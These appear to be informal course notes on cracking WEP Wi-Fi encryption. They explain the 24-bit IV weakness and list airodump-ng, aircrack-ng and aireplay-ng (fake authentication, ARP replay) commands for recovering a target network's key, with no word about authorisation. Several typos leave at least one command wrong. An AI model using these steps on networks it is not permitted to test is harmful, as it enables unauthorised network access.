GAINING ACCESS 
     WEP CRACKING 


1) Wired Equivalent Privacy
2) Old encryptio
3) Uses an algorithm called RC4
4) Still used in some networks
5) Can be cracked easily.


CRACKING:

1) Clients encrypts data using a key
2) Encrybted packets sent in the air
3) Router decrypts packet using the key.

CRACKING:
1) Each packet is encrypted using a unique key stream.
2) Random intiliazation vector (IV) is used to genarte the key streams.
3) The Initialization vector is only 24 bits!.
4) IV + Key (password) = key stream. 

WEAKNESS:
1) IV is too small (only 24 bits)
2) IV is sent in plain text.

Result:

1) IV's will repeat on busy networks 
2) This makes WEP vulnerable to statiatical attacks
3) Repeated IV's can be used to determine the key stream
4) And break the encryption


To HACK WEP all u need to do is:
run = airodump-ng --bssid <mac adress of the target network> --channel <> --write <name it any file> wlan0
run = aircrack-ng <THE.cap file>


THEN YOU WILL BE ABLE TO FIND THE KEY AND CONNECT TO THAT INTERNET
SIMPLE!!!


PROBLEM:
1) If network is not busy
2) It would take some time to capture enough IVs / data

SOLUTION: 
1) FORCE THE AP TO GENARTE ENOUGH IVs


aireplay-ng --fakeauth 0 -a <target network mac adress> -h <your mac wireless mac adress> wlan0  = it will sent the router and you willbe able to send as manty packets.

aireplay-ng --arpreplay -b <target network mac adress> -h <your mac wireless mac adress> wla0 = will generate many packets and force it then the router will accept it.
